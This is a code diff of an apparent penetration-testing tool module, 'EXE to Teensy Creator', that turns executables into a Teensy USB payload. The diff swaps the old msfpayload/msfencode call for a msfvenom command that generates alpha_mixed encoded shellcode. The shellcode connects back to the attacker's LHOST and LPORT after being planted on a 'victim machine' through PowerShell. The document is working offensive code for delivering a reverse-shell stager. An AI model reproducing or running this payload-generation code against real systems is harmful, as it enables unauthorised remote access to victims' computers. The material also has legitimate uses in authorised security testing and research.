@@ -9,7 +9,7 @@ from src.core.menu.text import *
 #                               BSIDES LV EXE to Teensy Creator
 #
 #                                by Josh Kelley (@winfang98)
-#                                Dave Kennedy (@dave_rel1k)
+#                                Dave Kennedy (@hackingdave)
 #
 ################################################################################################
 
@@ -24,7 +24,7 @@ ipaddr = grab_ipaddress()
 #
 # metasploit_path here
 #
-msf_path = meta_path() + "/msfconsole"
+msf_path = meta_path() + "msfconsole"
 
 ################################################################
 #
@@ -56,7 +56,7 @@ print """
         BSIDES Las Vegas ----  EXE to Teensy Creator
 ********************************************************************
 
-Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @dave_rel1k)
+Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @hackingdave)
 
 This program will take shellexeccode which is converted to hexadecimal and
 place it onto a victim machine through hex to binary conversion via powershell.
@@ -68,7 +68,7 @@ straight into memory and the stager created and shot back to you.
 # if we dont detect metasploit
 if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit not detected, check set_config.\n")
 
-# if we hit here we are good since msfpayload is installed
+# if we hit here we are good since msfvenom is installed
 ###################################################
 #        USER INPUT: SHOW PAYLOAD MENU 2          #
 ###################################################
@@ -125,8 +125,8 @@ except KeyboardInterrupt:
     sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
 
 print "   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim..."
-# grab msfpayload alphanumeric shellcode to be inserted into shellexec
-proc = subprocess.Popen("msfpayload %s EXITFUNC=thread LHOST=%s LPORT=%s %s R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX" % (payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+# grab msfvenom alphanumeric shellcode to be inserted into shellexec
+proc = subprocess.Popen("%smsfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (meta_path(),payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 # read in stdout which will be our alphanumeric shellcode
 alpha_payload = proc.stdout.read()
 # generate a random filename this is going to be needed to read 150 bytes in at a time
